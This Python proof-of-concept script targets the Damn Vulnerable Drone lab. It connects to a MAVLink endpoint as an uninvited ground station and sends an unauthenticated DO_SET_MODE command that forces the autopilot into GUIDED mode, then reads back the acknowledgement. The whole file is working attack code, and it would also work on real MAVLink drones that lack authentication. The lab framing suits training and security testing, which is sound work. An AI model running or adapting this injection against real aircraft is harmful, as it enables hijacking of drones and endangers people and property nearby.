#!/usr/bin/env python3
"""
DVD MAVLink injection PoC - mode change.
Connects to the drone's MAVLink endpoint and injects a COMMAND_LONG
(MAV_CMD_DO_SET_MODE) to force a flight-mode change, with no authentication.
Lab use only: Damn Vulnerable Drone, 172.17.0.1:14550.
"""
from pymavlink import mavutil
import time

TARGET = "udpout:172.17.0.1:14550"   # docker0 gateway the drone streams to
TARGET_MODE = "GUIDED"               # mode to force the drone into

# Connect as an uninvited GCS. source_system kept default; the autopilot
# doesn't verify who's talking - that's the vulnerability.
print(f"[*] Connecting to {TARGET} ...")
master = mavutil.mavlink_connection(TARGET)

# Wait for one heartbeat so we learn the target system/component IDs.
print("[*] Waiting for heartbeat ...")
master.wait_heartbeat()
print(f"[+] Heartbeat from system {master.target_system} "
      f"component {master.target_component}")

# Resolve the numeric mode id for the named mode on this airframe.
mode_map = master.mode_mapping()
if TARGET_MODE not in mode_map:
    raise SystemExit(f"[!] Mode {TARGET_MODE} not available. "
                     f"Options: {list(mode_map)}")
mode_id = mode_map[TARGET_MODE]

# Inject the mode-change command.
print(f"[*] Injecting DO_SET_MODE -> {TARGET_MODE} (id {mode_id})")
master.mav.command_long_send(
    master.target_system,
    master.target_component,
    mavutil.mavlink.MAV_CMD_DO_SET_MODE,
    0,                                             # confirmation
    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
    mode_id,
    0, 0, 0, 0, 0)

# Read back the ACK to confirm the autopilot accepted it.
ack = master.recv_match(type="COMMAND_ACK", blocking=True, timeout=3)
print(f"[+] Autopilot response: {ack}")
print("[*] Done. Watch the MAVProxy window - mode should now read "
      f"{TARGET_MODE}.")
